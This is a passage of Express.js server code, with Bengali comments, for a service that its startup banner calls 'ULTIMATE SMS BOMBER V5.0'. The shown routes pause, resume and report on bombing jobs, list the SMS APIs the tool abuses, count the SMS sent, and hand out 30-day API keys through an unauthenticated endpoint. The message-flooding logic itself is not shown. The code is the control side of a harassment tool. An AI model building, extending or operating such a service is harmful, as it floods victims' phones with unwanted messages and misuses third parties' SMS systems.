// ⭐ পজ এন্ডপয়েন্ট - ফিক্সড
// ============================================================
app.get('/api/pause', (req, res) => {
  const { jobId, all } = req.query;
  
  console.log(`⏸️ Pause request received: jobId=${jobId}, all=${all}`);
  
  if (all === 'true' || all === '1') {
    const count = bombController.pauseAllJobs();
    return res.json({
      success: true,
      message: `Paused ${count} active jobs`,
      developer: DEVELOPER_INFO,
      paused_count: count,
      timestamp: Utility.getISOString()
    });
  }
  
  if (jobId) {
    const success = bombController.pauseJob(jobId);
    if (success) {
      return res.json({
        success: true,
        message: `Job ${jobId} paused successfully`,
        developer: DEVELOPER_INFO,
        jobId: jobId,
        resume_endpoint: `/api/resume?jobId=${jobId}`,
        timestamp: Utility.getISOString()
      });
    } else {
      return res.status(404).json({
        success: false,
        error: `Job ${jobId} not found or already paused/completed`,
        developer: DEVELOPER_INFO
      });
    }
  }
  
  return res.status(400).json({
    success: false,
    error: 'Missing jobId or all parameter',
    developer: DEVELOPER_INFO,
    usage: '/api/pause?jobId=JOB_ID or /api/pause?all=true'
  });
});

// ============================================================
// ⭐ রিজিউম এন্ডপয়েন্ট - ফিক্সড
// ============================================================
app.get('/api/resume', (req, res) => {
  const { jobId, all } = req.query;
  
  console.log(`▶️ Resume request received: jobId=${jobId}, all=${all}`);
  
  if (all === 'true' || all === '1') {
    const count = bombController.resumeAllJobs();
    return res.json({
      success: true,
      message: `Resumed ${count} paused jobs`,
      developer: DEVELOPER_INFO,
      resumed_count: count,
      timestamp: Utility.getISOString()
    });
  }
  
  if (jobId) {
    const success = bombController.resumeJob(jobId);
    if (success) {
      return res.json({
        success: true,
        message: `Job ${jobId} resumed successfully`,
        developer: DEVELOPER_INFO,
        jobId: jobId,
        timestamp: Utility.getISOString()
      });
    } else {
      return res.status(404).json({
        success: false,
        error: `Job ${jobId} not found or not paused`,
        developer: DEVELOPER_INFO
      });
    }
  }
  
  return res.status(400).json({
    success: false,
    error: 'Missing jobId or all parameter',
    developer: DEVELOPER_INFO,
    usage: '/api/resume?jobId=JOB_ID or /api/resume?all=true'
  });
});

// ============================================================
// স্ট্যাটাস এন্ডপয়েন্ট
// ============================================================
app.get('/api/status', (req, res) => {
  const { jobId } = req.query;
  
  if (jobId) {
    const jobStatus = bombController.getJobStatus(jobId);
    if (jobStatus) {
      return res.json({
        success: true,
        job: jobStatus,
        developer: DEVELOPER_INFO
      });
    } else {
      return res.status(404).json({
        success: false,
        error: `Job ${jobId} not found`,
        developer: DEVELOPER_INFO
      });
    }
  }
  
  const jobs = bombController.getAllJobs();
  const stats = bombController.getStats();
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    stats: stats,
    jobs: jobs,
    total_jobs: jobs.length
  });
});

// ============================================================
// কী জেনারেট
// ============================================================
app.get('/api/expiredate=30&createkey', (req, res) => {
  const apiKey = Utility.generateApiKey();
  const expiryDate = new Date();
  expiryDate.setDate(expiryDate.getDate() + 30);
  
  validKeys.set(apiKey, expiryDate);
  saveKeys();
  
  res.json({
    success: true,
    api_key: apiKey,
    expiry_date: expiryDate.toISOString(),
    valid_days: 30,
    developer: DEVELOPER_INFO,
    message: "API key generated successfully"
  });
});

// ============================================================
// কী চেক
// ============================================================
app.get('/api/checkkey', (req, res) => {
  const { key } = req.query;
  
  if (!key) {
    return res.status(400).json({
      success: false,
      error: 'Missing API key parameter',
      developer: DEVELOPER_INFO
    });
  }
  
  const isValid = isKeyValid(key);
  const expiryDate = validKeys.get(key);
  
  res.json({
    success: true,
    valid: isValid,
    api_key: key,
    expiry_date: expiryDate ? expiryDate.toISOString() : null,
    status: isValid ? 'active' : 'invalid or expired',
    developer: DEVELOPER_INFO
  });
});

// ============================================================
// সব API লিস্ট
// ============================================================
app.get('/api/apis', (req, res) => {
  res.json({
    developer: DEVELOPER_INFO,
    total_apis: SMS_APIS.length,
    apis: SMS_APIS.map(api => ({
      id: api.id,
      name: api.name,
      method: api.method
    }))
  });
});

// ============================================================
// স্ট্যাটস
// ============================================================
app.get('/api/stats', (req, res) => {
  const stats = bombController.getStats();
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    stats: stats,
    total_keys: validKeys.size,
    timestamp: Utility.getISOString()
  });
});

// ============================================================
// হেলথ চেক
// ============================================================
app.get('/api/health', (req, res) => {
  const stats = bombController.getStats();
  
  res.json({
    status: 'active',
    developer: DEVELOPER_INFO,
    version: "5.0.0-FIXED",
    timestamp: Utility.getISOString(),
    uptime: stats.uptime,
    total_apis: SMS_APIS.length,
    total_keys: validKeys.size,
    active_jobs: stats.activeJobs,
    paused_jobs: stats.pausedJobs,
    total_sms_sent: stats.totalSMS
  });
});

// ============================================================
// 404 হ্যান্ডলার
// ============================================================
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: 'Endpoint not found',
    developer: DEVELOPER_INFO,
    path: req.path
  });
});

// ============================================================
// Error Handler
// ============================================================
app.use((err, req, res, next) => {
  console.error('❌ Error:', err.stack);
  res.status(500).json({
    success: false,
    error: 'Internal server error',
    developer: DEVELOPER_INFO,
    message: err.message
  });
});

// ============================================================
// সার্ভার স্টার্ট
// ============================================================
app.listen(PORT, '0.0.0.0', () => {
  console.log(`\n🚀 ULTIMATE SMS BOMBER V5.0-FIXED RUNNING`);
  console.log(`🌐 Port: ${PORT}`);
  console.log(`📡 Total APIs: ${SMS_APIS.length}`);
  console.log(`💾 Total Keys: ${validKeys.size}`);
  console.log(`\n🛑 STOP API: /api/stop?all=true`);
  console.log(`⏸️ PAUSE API: /api/pause?all=true`);
  console.log(`▶️ RESUME API: /api/resume?all=true`);
  console.log(`📊 STATUS: /api/status`);
  console.log(`\n✅ Server ready!\n`);
});

module.exports = app;
